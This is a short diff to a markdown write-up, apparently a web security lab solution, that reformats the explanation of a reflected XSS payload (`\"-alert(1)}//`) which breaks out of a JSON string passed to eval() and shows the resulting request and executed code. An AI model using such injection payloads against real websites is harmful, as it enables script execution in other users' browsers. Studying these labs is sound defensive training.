@@ -14,10 +14,10 @@
   
 ### Explanation
 
-- \" breaks out of the current string safely.
-- -alert(1) is a valid JavaScript expression and avoids syntax errors.
-- } closes the object.
-- // comments out the rest of the code to prevent crashes.
+- `\"` breaks out of the current string safely.
+- `-alert(1)` is a valid JavaScript expression and avoids syntax errors.
+- `}` closes the object.
+- `//` comments out the rest of the code to prevent crashes.
 - Final request: `GET /search-results?search=\"-alert(1)}//`
 - Once injected, the eval() function runs: `var searchResultsObj = {"searchTerm":"\"-alert(1)}//", "results":[]};`
 - This triggers `alert(1)`, confirming JavaScript execution.
